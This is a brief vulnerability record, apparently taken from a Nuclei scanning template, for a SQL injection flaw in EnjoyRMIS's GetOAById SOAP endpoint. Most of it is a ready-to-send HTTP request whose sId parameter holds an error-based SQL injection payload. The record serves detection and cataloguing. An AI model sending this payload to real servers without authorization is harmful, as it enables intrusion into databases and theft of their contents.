# Vulnerability: EnjoyRMIS - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`enjoyrmis-sqli.yaml`)

## Description
EnjoyRMIS GetOAById has a SQL injection vulnerability, through which an attacker can obtain sensitive database information and even control the server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetOAById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOAById xmlns="http://tempuri.org/">
      <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
    </GetOAById>
  </soap:Body>
</soap:Envelope>
```

